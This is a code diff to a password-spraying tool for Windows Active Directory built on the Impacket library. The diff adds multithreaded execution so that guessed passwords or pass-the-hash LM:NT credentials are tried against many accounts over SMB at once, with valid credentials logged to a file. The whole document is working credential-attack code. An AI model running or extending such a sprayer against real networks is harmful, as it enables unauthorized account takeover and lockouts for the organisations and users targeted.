@@ -1,6 +1,8 @@
 from impacket.dcerpc.v5 import transport, scmr
+from pebble import ProcessPool
 from impacket import version
 from time import sleep
+
 import argparse
 import logging
 import sys
@@ -69,6 +71,19 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
                     f.write(green_plus, upasscombo.ljust(30), "Valid Creds")
                     f.close()
 
+def mt_execute(username):  # multithreading requires a function
+    try:
+        sendit(username, options.p, options.d, options.target, options.target, options.H, None, False, None, int(445))
+    except Exception as e:
+        print(str(e))
+        if options.o is not None:
+            with open(options.o, 'a') as f:
+                f.write(str(e))
+                f.close()
+
+    if options.delay is not None:
+        sleep(options.delay)
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Impacket made password sprayer for Windows AD")
@@ -78,7 +93,8 @@ if __name__ == '__main__':
     parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
     parser.add_argument('-o', action='store', help='Output file')
     parser.add_argument('-s', action='store_true', default=False, help='Quiet mode will only print valid accounts')
-    parser.add_argument('-delay', action='store', help='Number of seconds to wait between each account')
+    parser.add_argument('-threads', action='store', default=1, type=int, help='Number of threads to use (Default=1)')
+    parser.add_argument('-delay', action='store', type=int, help='Number of seconds to wait between each account')
     parser.add_argument('target', action='store', help='IP to check the account against')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
@@ -122,15 +138,12 @@ if __name__ == '__main__':
     else:
         users_cleaned.append(options.u)
 
-    for username in users_cleaned:
-        try:
-            sendit(username, options.p, options.d, options.target, options.target, options.H, None, False, None, int(445))
-        except Exception as e:
-            print(str(e))
-            if options.o is not none:
-                with open(options.o, 'a') as f:
-                    f.write(str(e))
-                    f.close()
+    if options.delay is not None:
+        options.threads = 1
 
-        if options.delay is not None:
-            sleep(int(options.delay))
+    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
+        for username in users_cleaned:
+            try:
+                out = thread_exe.schedule(mt_execute, (username,), timeout=10)
+            except Exception as e:
+                print(str(e))
